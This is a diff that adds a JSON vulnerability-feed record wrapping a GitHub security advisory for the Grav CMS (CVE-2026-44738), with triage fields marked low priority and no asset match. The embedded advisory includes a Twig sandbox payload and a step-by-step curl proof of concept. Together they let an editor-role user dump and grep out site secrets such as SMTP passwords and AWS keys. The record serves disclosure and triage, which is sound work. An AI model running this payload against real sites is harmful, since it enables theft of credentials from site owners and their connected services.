@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/83944100?v=4\", \"events_url\": \"https://api.github.com/users/Revanth011/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Revanth011/followers\", \"following_url\": \"https://api.github.com/users/Revanth011/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Revanth011/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Revanth011\", \"id\": 83944100, \"login\": \"Revanth011\", \"node_id\": \"MDQ6VXNlcjgzOTQ0MTAw\", \"organizations_url\": \"https://api.github.com/users/Revanth011/orgs\", \"received_events_url\": \"https://api.github.com/users/Revanth011/received_events\", \"repos_url\": \"https://api.github.com/users/Revanth011/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Revanth011/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Revanth011/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Revanth011\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44738\", \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}], \"description\": \"## Summary\\n\\nThe Twig sandbox allow-list permits any user with the `admin.pages` role to call `config.toArray()` from within a page body, dumping the entire merged site configuration — including all plugin secrets (SMTP passwords, AWS keys, OAuth client secrets, API tokens) — into the rendered HTML. No administrator privileges are required.\\n\\n## Details\\n\\nThe Twig sandbox allow-list in `system/config/security.yaml` explicitly permits `Config::toArray()` for the `Grav\\\\Common\\\\Config\\\\Config` class:\\n\\n```yaml\\n- class: 'Grav\\\\Common\\\\Config\\\\Config'\\n  methods: 'get, toarray, value, default, offsetget, offsetexists'\\n```\\n\\nThe `config` object — which holds the full merged configuration tree including every key under `plugins.*` — is injected into every sandboxed render in `system/src/Grav/Common/Twig/Twig.php` (line 292):\\n\\n```php\\n$twig_vars = [..., 'config' => $config, ...]\\n```\\n\\nAny editor with `admin.pages` can save a page with `process.twig: true` in the frontmatter and the following payload in the body:\\n\\n```\\n{{ config.toArray()|json_encode|raw }}\\n```\\n\\nWhen the page is rendered, the full config tree is dumped as JSON in the HTML, including all plugin secrets stored under `user/config/plugins/*.yaml`.\\n\\n## PoC\\n\\n```bash\\n# Step 1 — Get login nonce\\nNONCE=$(curl -sc /tmp/cookies.txt http://TARGET/admin \\\\\\n  | grep -oP '(?<=name=\\\"login-nonce\\\" value=\\\")[^\\\"]+')\\n\\n# Step 2 — Login as editor (no admin.super)\\ncurl -sc /tmp/cookies.txt -b /tmp/cookies.txt \\\\\\n  -X POST http://TARGET/admin \\\\\\n  --data-urlencode \\\"data[username]=EDITOR_USER\\\" \\\\\\n  --data-urlencode \\\"data[password]=EDITOR_PASS\\\" \\\\\\n  --data-urlencode \\\"task=login\\\" \\\\\\n  --data-urlencode \\\"login-nonce=${NONCE}\\\" -o /dev/null\\n\\n# Step 3 — Get admin nonce\\nADMIN_NONCE=$(curl -s -b /tmp/cookies.txt http://TARGET/admin/pages \\\\\\n  | grep -oP '(?<=admin-nonce\\\" value=\\\")[^\\\"]+' | head -1)\\n\\n# Step 4 — Save page with process.twig:true and payload\\ncurl -s -b /tmp/cookies.txt \\\\\\n  -X POST http://TARGET/admin/pages/poc \\\\\\n  --data-urlencode \\\"admin-nonce=${ADMIN_NONCE}\\\" \\\\\\n  --data-urlencode \\\"task=save\\\" \\\\\\n  --data-urlencode \\\"data[frontmatter]=title: poc\\nprocess:\\n    twig: true\\npublished: true\\\" \\\\\\n  --data-urlencode \\\"data[content]={{ config.toArray()|json_encode|raw }}\\\" \\\\\\n  --data-urlencode \\\"data[folder]=poc\\\" \\\\\\n  --data-urlencode \\\"data[route]=/\\\" \\\\\\n  --data-urlencode \\\"data[name]=default\\\" -o /dev/null\\n\\n# Step 5 — Retrieve secrets from rendered page\\ncurl -s http://TARGET/poc | grep -o '\\\"password\\\":\\\"[^\\\"]*\\\"'\\n```\\n\\n## Impact\\n\\nAny user with the editor role (`admin.pages`) can exfiltrate all plugin credentials stored in the site configuration without any administrator privileges. Affected secrets include SMTP passwords, AWS access/secret keys, OAuth client secrets, reCAPTCHA keys, and any API token stored in plugin YAML config. Each extracted credential independently compromises the connected service.\", \"epss\": {\"percentage\": 0.00276, \"percentile\": 0.19492}, \"ghsa_id\": \"GHSA-j274-39qw-32c9\", \"github_reviewed_at\": \"2026-05-13T15:29:40Z\", \"html_url\": \"https://github.com/advisories/GHSA-j274-39qw-32c9\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-j274-39qw-32c9\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44738\"}], \"nvd_published_at\": \"2026-05-11T17:16:34Z\", \"published_at\": \"2026-05-13T15:29:40Z\", \"references\": [\"https://github.com/getgrav/grav/security/advisories/GHSA-j274-39qw-32c9\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44738\", \"https://github.com/getgrav/grav/releases/tag/2.0.0-rc.2\", \"https://github.com/advisories/GHSA-j274-39qw-32c9\"], \"repository_advisory_url\": \"https://api.github.com/repos/getgrav/grav/security-advisories/GHSA-j274-39qw-32c9\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/getgrav/grav\", \"summary\": \"Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-13T15:29:43Z\", \"url\": \"https://api.github.com/advisories/GHSA-j274-39qw-32c9\", \"vulnerabilities\": [{\"first_patched_version\": \"2.0.0-rc.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"getgrav/grav\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.0.0-rc.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-j274-39qw-32c9",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "getgrav/grav: <= 2.0.0-rc.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44738"
+    ],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "getgrav/grav"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.610048Z",
+  "provenance": {
+    "content_sha256": "39dc998a98012056ecbcd7980998f7c4faa328aeff2db19bae2ac2991ba2c764",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-13T15:29:40Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-j274-39qw-32c9",
+  "status": "active",
+  "title": "Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()",
+  "updated_at": "2026-05-13T15:29:43Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-j274-39qw-32c9"
+}
